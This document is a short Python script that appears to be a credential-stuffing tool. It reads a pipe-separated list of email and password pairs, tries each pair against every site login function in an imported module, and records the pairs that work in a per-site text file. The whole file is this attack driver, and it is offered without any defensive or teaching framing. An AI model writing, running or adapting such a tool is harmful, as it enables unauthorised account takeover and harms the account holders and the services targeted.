#!/usr/bin/env python
import os
import sys
import argparse
import sitefunctions

def parse_accounts(accounts_file):
    return (line.strip().split('|') for line in open(accounts_file))

def test_accounts(accounts, sites):
    for email, password in accounts:
        for site in sites:
            print("testing %s on %s" % (email, site.__name__), file=sys.stderr)
            if site(email, password):
                yield (email, password, site)

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('accounts', help='path to pipe-separated account list')
    args = parser.parse_args()

    accounts = parse_accounts(args.accounts)
    for email, password, site in test_accounts(accounts, sitefunctions.sites):
        with open(site.__name__ + ".txt", 'a') as f:
            print("%s|%s" % (email, password), file=f)

if __name__ == '__main__': main()
